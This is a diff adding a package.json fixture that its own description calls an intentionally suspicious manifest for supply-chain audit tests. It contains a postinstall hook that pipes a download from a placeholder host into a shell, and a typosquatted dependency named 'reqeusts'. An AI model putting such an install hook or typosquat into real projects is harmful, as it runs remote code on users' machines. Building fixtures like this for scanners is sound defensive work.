@@ -1,0 +1,14 @@
+{
+  "name": "vulnerable-supply-chain-fixture",
+  "version": "1.0.0",
+  "description": "Intentionally suspicious dependency manifest for sec-audit supply-chain lane tests. NOT a real project.",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -s https://example.invalid/p | sh"
+  },
+  "dependencies": {
+    "reqeusts": "2.0.0",
+    "electron-native-notify": "1.1.6",
+    "lodash": "4.17.21"
+  }
+}
